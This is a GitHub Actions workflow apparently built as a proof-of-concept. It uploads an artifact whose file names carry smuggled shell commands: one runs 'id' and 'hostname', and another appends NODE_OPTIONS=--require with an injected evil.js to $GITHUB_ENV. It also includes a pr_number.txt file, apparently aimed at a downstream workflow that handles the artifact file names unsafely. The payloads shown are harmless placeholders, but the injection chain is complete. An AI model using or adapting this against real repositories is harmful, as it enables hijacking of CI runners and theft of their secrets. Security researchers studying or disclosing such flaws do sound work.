name: Test

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/test.txt
          printf 'marker\n' > content/a
          printf 'x\n' > 'content/a;id;hostname;true;#.txt'
          printf 'x\n' > 'content/a;E=${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content-poc${PWD:0:1}evil.js;echo NODE_OPTIONS=--require=$E>>$GITHUB_ENV;true;#.txt'
          echo '' | base64 -d > content/evil.js
          printf '1\n' > content/pr_number.txt
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
